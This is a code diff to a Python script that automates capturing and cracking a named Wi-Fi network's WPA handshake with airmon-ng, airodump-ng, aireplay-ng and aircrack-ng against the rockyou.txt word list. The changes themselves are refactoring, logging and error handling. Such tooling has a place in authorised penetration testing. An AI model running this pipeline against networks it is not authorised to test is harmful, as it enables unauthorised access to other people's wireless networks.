@@ -9,6 +9,18 @@ from pathlib import Path
 import glob
 import csv
 
+def print_program_args(args):
+    # Log what we're doing
+    logging.info("target: %s", args.target)
+    logging.info("interface: %s", args.interface)
+    logging.info("capture file: %s", args.capfile)
+
+def print_network_info(info: dict):
+    print("\nFound Target Network:\n" + "-"*30)
+    for key, value in info.items():
+        print(f"{key:<15}: {value}")
+    print('\n')
+
 def get_latest_output_file(basename: str) -> str | None:
     pattern = f"{basename}-*.cap"
     files = glob.glob(pattern)
@@ -18,15 +30,18 @@ def get_latest_output_file(basename: str) -> str | None:
     latest_file = max(files, key=os.path.getctime)
     return latest_file
 
-def run_aircrack(capfile: str):
+def run_aircrack(capfile: str) -> subprocess.CompletedProcess:
     logging.info("running aircrack-ng")
 
     full_capfile_name = get_latest_output_file(capfile)
+    if not full_capfile_name:
+        logging.error("Could not find capture file matching '{capfile}'")
+        return subprocess.CompletedProcess(args=[], returncode=1)
 
-    # TODO: make the word list item default to rockyou.txt but also have it be a command arg
+    # TODO: make it so the path to the word list is a command line arg, if not provided default to rockyou.txt
     cmd = ["sudo", "aircrack-ng", full_capfile_name, "-w", "/usr/share/wordlists/rockyou.txt"]
-    
-    return subprocess.run(cmd, capture_output=True, text=True)
+
+    return subprocess.run(cmd, check=True)
 
 def put_interface_in_same_channel(iface: str, channel: str):
     logging.info("putting interface in channel %s", channel)
@@ -38,7 +53,7 @@ def put_interface_in_same_channel(iface: str, channel: str):
     subprocess.run(cmd, capture_output=True, text=True)
     
 def start_airodump(airodump_args, stop_event):
-    logging.info("inside start_airodump")
+    logging.info("starting airodump")
     cmd = [
         "sudo", "airodump-ng", "-w", airodump_args["cap_file_name"],
         "-c", str(airodump_args["channel"]), "--bssid", airodump_args["BSSID"],
@@ -84,10 +99,8 @@ def enable_monitor_mode(iface: str) -> str:
     if iface.endswith("mon"):
         return iface  # already monitor mode
 
-    # airmon‑ng outputs something like:  (monitor mode enabled on wlan0mon)
     cmd = ["sudo", "airmon-ng", "start", iface]
-    logging.info("[*] Enabling monitor mode: %s", cmd)
-    
+    logging.info("[*] Enabling monitor mode")
     subprocess.run(cmd, capture_output=True, text=True, check=True)
 
 def clean_up_network_info(network_info: dict) -> dict:
@@ -177,22 +190,19 @@ def main():
     parser.add_argument("--interface", required=True, help="Wireless interface in monitor mode (e.g., wlan0mon)")
     parser.add_argument("--capfile", required=True, help="Output capture file prefix (e.g., 'output-file')")
 
-    # Parse the arguments
+    # Parse the arguments and log what we're doing
     args = parser.parse_args()
+    print_program_args(args)
 
-    # Log what we're doing
-    logging.info("target: %s", args.target)
-    logging.info("interface: %s", args.interface)
-    logging.info("capture file: %s", args.capfile)
-
+    # Kill any processes that could cause interference and put adapter in monitor mode
     kill_conflicting_processes()
     enable_monitor_mode(args.interface)
 
     network_info = find_network_info_by_essid(args.target, args.interface)
-    
-    logging.info("Target Network Info: %s", network_info)
-    
+
     if network_info:
+        print_network_info(network_info)
+
         aireplay_stop_event = threading.Event()
         airodump_stop_event = threading.Event()
         
@@ -223,7 +233,7 @@ def main():
 if __name__ == "__main__":
     logging.basicConfig(
         level=logging.INFO,
-        format='[%(asctime)s] [%(levelname)s] %(message)s',
+        format='[%(asctime)s] %(levelname)s: %(message)s',
         datefmt='%H:%M:%S'
     )
     try:
